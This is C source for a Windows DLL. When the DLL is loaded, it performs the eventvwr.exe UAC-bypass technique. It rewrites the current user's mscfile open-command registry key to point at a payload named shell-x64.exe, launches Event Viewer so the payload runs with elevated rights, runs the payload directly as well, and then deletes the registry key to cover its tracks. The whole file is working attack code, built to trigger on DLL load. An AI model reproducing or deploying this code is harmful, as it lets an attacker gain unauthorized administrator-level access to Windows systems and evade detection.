#include <stdio.h>
#include <stdbool.h>
#include <windows.h>
#include <GL/gl.h>
#include <GL/glu.h>

/*
 * Pretty standard code to recursively nuke a Reg Key
 */

 int RegDelnodeRecurse (LPTSTR lpSubKey) {
    LPTSTR lpEnd;
    LONG lResult;
    DWORD dwSize = MAX_PATH;
    TCHAR szName[MAX_PATH];
    HKEY hKey;
    FILETIME ftWrite;

    lResult = RegDeleteKey(HKEY_CURRENT_USER, lpSubKey);

    if (lResult == ERROR_SUCCESS) return 1;

    lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ, &hKey);

    if (lResult != ERROR_SUCCESS) return lResult == ERROR_FILE_NOT_FOUND;

    lpEnd    = lpSubKey + lstrlen(lpSubKey);
    *lpEnd++ = '\\';
    *lpEnd   = '\0';

    if (RegEnumKeyEx(hKey, 0, szName, &dwSize, 0, 0, 0, &ftWrite) == ERROR_SUCCESS) {
        do {
            strcpy(lpEnd, szName);
            if (!RegDelnodeRecurse(lpSubKey)) break;
            lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, 0, 0, 0, &ftWrite);
        } while (lResult == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = TEXT('\0');

    RegCloseKey(hKey);

	return RegDeleteKey(HKEY_CURRENT_USER, lpSubKey) == ERROR_SUCCESS;
}

/*
 * Wrapper for above
 */

int RegDelnode() {
    TCHAR szDelKey[MAX_PATH*2] = "Software\\Classes\\mscfile";
    return RegDelnodeRecurse(szDelKey);
}

// Function to execute shell-x64.exe
void ExecuteShell()
{
    HKEY attackKey;
	SHELLEXECUTEINFO exInfo;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    char evtVwr[MAX_PATH];

    si.cb = sizeof(STARTUPINFO);

    // Execute shell-x64.exe
    char exePath[MAX_PATH] = ".\\shell-x64.exe";    //Current Directory (relative path)
    sprintf(evtVwr, "%s\\System32\\eventvwr.exe", getenv("SYSTEMROOT"));

	if(!RegDelnode()) return;
	if(RegCreateKey(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command", &attackKey)!=ERROR_SUCCESS) return;

	RegSetValueEx(attackKey, "", 0, REG_SZ, exePath, strlen(exePath));

	exInfo.lpVerb       = "open";
	exInfo.lpFile       = evtVwr;
	exInfo.nShow        = 0;
	exInfo.fMask        = SEE_MASK_NOCLOSEPROCESS;
	exInfo.cbSize       = sizeof(SHELLEXECUTEINFO);
	exInfo.hwnd         = 0;
	exInfo.lpParameters = 0;
	exInfo.lpDirectory  = 0;
	exInfo.hInstApp     = 0;

	ShellExecuteEx(&exInfo);

    if (CreateProcess(exePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        // Close process handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        MessageBox(NULL, "Failed to execute", "Error", MB_OK | MB_ICONERROR);
    }

    Sleep(5000);

	TerminateProcess(exInfo.hProcess, 0);

	RegCloseKey(attackKey);
	RegDelnode();
}

// DllMain Function
bool WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            ExecuteShell();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
